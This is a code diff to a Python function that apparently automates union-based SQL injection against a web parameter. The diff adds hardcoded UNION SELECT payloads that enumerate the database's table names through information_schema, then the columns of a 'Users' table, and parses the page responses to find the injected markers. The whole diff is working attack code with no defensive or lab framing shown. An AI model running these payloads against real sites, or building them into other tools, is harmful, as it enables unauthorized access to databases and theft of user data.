@@ -88,19 +88,39 @@ def get_union_based_injection(query_params, base_url):
         
         #! INJECTING PARAMETERS TO FIND CATEGORY
         payload = generate_union_select_payload(columns)
-        
         params = query_params.copy() if isinstance(query_params, dict) else {}
-        
         param_name = list(params.keys())[0] if params else query_params
         params[param_name] = payload
         
         response = requests.get(base_url, params=params)
-        print(f"{colored(response.url, RED)}")
+        # print(f"{colored(response.url, RED)}")
         
         marker_to_find = generate_marker_to_find(columns)
-        # for marker in marker_to_find:
-        #     if marker in response.text:
-        #         print(marker)
+
+        #! FINDING MARKER POS IN PAGE
+        soup = BeautifulSoup(response.text, "html.parser")
+        class_elements = soup.find_all(string=True)
+        
+        for element in class_elements:            
+            if element in marker_to_find:
+                print(f"[{colored(element, GREEN)}]")
+            elif element == '\n':
+                pass
+            else:
+                print(f"[{colored(element, YELLOW)}]")
+        
+        
+        # print(f"Extracted values: {marker_to_find}")
+        # print(response.url)
+        
+        #! FINDING TABLE NAME 
+        payload = "' UNION SELECT GROUP_CONCAT(table_name), 2, 3 FROM information_schema.tables WHERE table_schema=DATABASE()-- -"
+        print(f"{colored(payload, GREEN)}")
+        params = query_params.copy() if isinstance(query_params, dict) else {}
+        
+        param_name = list(params.keys())[0] if params else query_params
+        params[param_name] = payload
+        response = requests.get(base_url, params=params)
         
         soup = BeautifulSoup(response.text, "html.parser")
         class_elements = soup.find_all(string=True)
@@ -113,20 +133,32 @@ def get_union_based_injection(query_params, base_url):
             else:
                 print(f"[{colored(element, RED)}]")
         
-        # print(f"{colored(response.text, GREEN)}")
-        
-        
-        # print(f"Extracted values: {marker_to_find}")
-        # print(response.url)
-        
-        # payload = "2' UNION SELECT 1, GROUP_CONCAT(table_name), 3 FROM information_schema.tables WHERE table_schema=DATABASE()-- -"
-        # payload = "2' union select 1,group_concat(column_name),3 FROM information_schema.columns where table_name="Users" --+-"
+        #! FINDING COLUMN_NAME
+        payload = "' UNION SELECT GROUP_CONCAT(column_name),2 , 3 FROM information_schema.columns WHERE table_name='Users'-- -"
+        print(f"{colored(payload, GREEN)}")
         params = query_params.copy() if isinstance(query_params, dict) else {}
         
         param_name = list(params.keys())[0] if params else query_params
         params[param_name] = payload
         response = requests.get(base_url, params=params)
         
-        print(response.text)
+        soup = BeautifulSoup(response.text, "html.parser")
+        class_elements = soup.find_all(string=True)
+        
+        for element in class_elements:            
+            if element in marker_to_find:
+                print(f"[{colored(element, GREEN)}]")
+            elif element == '\n':
+                pass
+            else:
+                print(f"[{colored(element, MAGENTA)}]")
+        
+        print()
+        
+        
+        # print(f"{colored(response.text, GREEN)}")
+        
+        # print(response.text)
+        print(f"{colored(response.url, RED)}")
         # # print(f"{colored(response.url, RED, styles=BOLD)}")
 
